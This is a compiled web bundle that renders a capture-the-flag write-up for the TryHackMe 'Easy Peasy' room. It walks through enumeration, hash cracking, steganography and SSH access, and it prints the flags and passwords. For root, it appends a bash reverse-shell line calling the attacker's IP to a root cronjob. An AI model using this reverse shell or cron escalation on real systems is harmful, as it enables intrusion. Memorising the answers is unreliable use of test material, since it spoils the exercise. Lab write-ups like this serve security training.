"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[5766],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var i=r.createContext({}),p=function(e){var t=r.useContext(i),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(i.Provider,{value:t},e.children)},u="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,i=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),m=a,d=u["".concat(i,".").concat(m)]||u[m]||h[m]||o;return n?r.createElement(d,s(s({ref:t},c),{},{components:n})):r.createElement(d,s({ref:t},c))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,s=new Array(o);s[0]=m;var l={};for(var i in t)hasOwnProperty.call(t,i)&&(l[i]=t[i]);l.originalType=e,l[u]="string"==typeof e?e:a,s[1]=l;for(var p=2;p<o;p++)s[p]=n[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},36890:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>s,default:()=>h,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={},s="Easy Peasy",l={unversionedId:"Tryhackme/Easy Peasy/Easy Peasy",id:"Tryhackme/Easy Peasy/Easy Peasy",title:"Easy Peasy",description:"Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.",source:"@site/writeups/Tryhackme/Easy Peasy/Easy Peasy.md",sourceDirName:"Tryhackme/Easy Peasy",slug:"/Tryhackme/Easy Peasy/",permalink:"/writeups/Tryhackme/Easy Peasy/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"dogcat",permalink:"/writeups/Tryhackme/Dogcat/"},next:{title:"Empire",permalink:"/writeups/Tryhackme/Empire/"}},i={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Enumeration through Nmap",id:"enumeration-through-nmap",level:2},{value:"Compromising the machine",id:"compromising-the-machine",level:2}],c={toc:p},u="wrapper";function h(e){let{components:t,...o}=e;return(0,a.kt)(u,(0,r.Z)({},c,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"easy-peasy"},"Easy Peasy"),(0,a.kt)("p",null,"Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob."),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/easypeasyctf"},"Easy Peasy")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Cryptography",(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},"Base64"),(0,a.kt)("li",{parentName:"ul"},"Base62"),(0,a.kt)("li",{parentName:"ul"},"Binary"))),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)"),(0,a.kt)("li",{parentName:"ul"},"Stegangraphy"),(0,a.kt)("li",{parentName:"ul"},"Exploiting Crontab")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"enumeration-through-nmap"},"Enumeration through Nmap"),(0,a.kt)("p",null,"Deploy the machine attached to this task and use nmap to enumerate it."),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"How many ports are open?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ sudo nmap -sC -sV -sS -Pn -p- 10.10.152.0\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 11:42 CEST\nNmap scan report for 10.10.152.0\nHost is up (0.033s latency).\nNot shown: 65532 closed ports\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    nginx 1.16.1\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: nginx/1.16.1\n|_http-title: Welcome to nginx!\n6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)\n|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)\n|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)\n65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Apache/2.4.43 (Ubuntu)\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.25 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"3")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the version of nginx?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"1.16.1")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"What is running on the highest port?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"65524")),(0,a.kt)("h2",{id:"compromising-the-machine"},"Compromising the machine"),(0,a.kt)("p",null,"Now you've enumerated the machine, answer questions and compromise it!"),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Using GoBuster, find flag 1.")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ gobuster dir -u http://10.10.152.0/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.152.0/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/05 11:44:02 Starting gobuster\n===============================================================\n/hidden (Status: 301)\nProgress: 119963 / 220561 (54.39%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/05 11:51:16 Finished\n===============================================================\n\nkali@kali:~/CTFs/tryhackme/Easy Peasy$ gobuster dir -u http://10.10.152.0/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.152.0/hidden\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/05 11:52:41 Starting gobuster\n===============================================================\n/whatever (Status: 301)\nProgress: 75300 / 220561 (34.14%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/05 11:57:05 Finished\n===============================================================\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"view-source:http://10.10.152.0/hidden/whatever/"},"view-source:http://10.10.152.0/hidden/whatever/"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d\nflag{f1rs7_fl4g}\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{f1rs7_fl4g}")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Further enumerate the machine, what is flag 2?")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.152.0:65524/robots.txt"},"http://10.10.152.0:65524/robots.txt"))),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"a18672860d0510e5ab6699730763b250")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{1m_s3c0nd_fl4g}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Crack the hash with easypeasy.txt, What is the flag 3?")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.152.0:65524/"},"http://10.10.152.0:65524/"))),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(83724).Z,width:"834",height:"474"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{9fdafbd64c47471a8f54cd3fc64cd312}")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"What is the hidden directory?")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"view-source:http://10.10.152.0:65524/"},"view-source:http://10.10.152.0:65524/"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},"<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://www.better-converter.com/Encoders-Decoders/Base62-Decode"},"Base62 Decode Online Tool"))),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/n0th1ng3ls3m4tt3r")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"Using the wordlist that provided to you in this task crack the hash what is the password?")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/"},"http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/"))),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"2020-10-05_12-10.png",src:n(26632).Z,width:"649",height:"197"})),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ john --wordlist=easypeasy.txt --format=gost matrix.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gost, GOST R 34.11-94 [64/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmypasswordforthatjob (?)\n1g 0:00:00:00 DONE (2020-10-05 12:14) 20.00g/s 81920p/s 81920c/s 81920C/s mypasswordforthatjob..flash88\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"mypasswordforthatjob")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the password to login to the machine via SSH?")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg"},"http://10.10.152.0:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg"))),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Easy Peasy$ steghide extract -sf binarycodepixabay.jpg\nEnter passphrase:\nwrote extracted data to "secrettext.txt".\nkali@kali:~/CTFs/tryhackme/Easy Peasy$ cat secrettext.txt\nusername:boring\npassword:\n01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001\n')),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://www.rapidtables.com/convert/number/binary-to-ascii.html"},"https://www.rapidtables.com/convert/number/binary-to-ascii.html"))),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"iconvertedmypasswordtobinary")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ ssh boring@10.10.152.0 -p 6498\nThe authenticity of host '[10.10.152.0]:6498 ([10.10.152.0]:6498)' can't be established.\nECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[10.10.152.0]:6498' (ECDSA) to the list of known hosts.\n*************************************************************************\n**        This connection are monitored by government offical          **\n**            Please disconnect if you are not authorized              **\n** A lawsuit will be filed against you if the law is not followed      **\n*************************************************************************\nboring@10.10.152.0's password:\nYou Have 1 Minute Before AC-130 Starts Firing\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!\nYou Have 1 Minute Before AC-130 Starts Firing\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!\nboring@kral4-PC:~$ ls\nuser.txt\nboring@kral4-PC:~$ cat user.txt\nUser Flag But It Seems Wrong Like It`s Rotated Or Something\nsynt{a0jvgf33zfa0ez4y}\nboring@kral4-PC:~$\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ echo \"synt{a0jvgf33zfa0ez4y}\" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'\nflag{n0wits33msn0rm4l}\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{n0wits33msn0rm4l}")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"boring@kral4-PC:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh\n\nboring@kral4-PC:~$ cd /var/www/\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Easy Peasy$ nc -nlvp 9001\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'boring@kral4-PC:/var/www$ echo "bash -i >& /dev/tcp/10.8.106.222/9001 0>&1" >> .mysecretcronjob.sh\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"root@kral4-PC:~# ls -la\nls -la\ntotal 40\ndrwx------  5 root root 4096 Jun 15 12:40 .\ndrwxr-xr-x 23 root root 4096 Jun 15 01:08 ..\n-rw-------  1 root root    2 Oct  5 03:45 .bash_history\n-rw-r--r--  1 root root 3136 Jun 15 12:40 .bashrc\ndrwx------  2 root root 4096 Jun 13 15:40 .cache\ndrwx------  3 root root 4096 Jun 13 15:40 .gnupg\ndrwxr-xr-x  3 root root 4096 Jun 13 15:44 .local\n-rw-r--r--  1 root root  148 Aug 17  2015 .profile\n-rw-r--r--  1 root root   39 Jun 15 01:01 .root.txt\n-rw-r--r--  1 root root   66 Jun 14 21:48 .selected_editor\nroot@kral4-PC:~# cat .root.txt\ncat .root.txt\nflag{63a9f0ea7bb98050796b649e85481845}\nroot@kral4-PC:~#\n")))}h.isMDXComponent=!0},83724:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-10-05_12-05-2fe413785976094fa802d2b8ea398464.png"},26632:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/2020-10-05_12-10-48937d37a82ca3f5825b575cb599b538.png"}}]);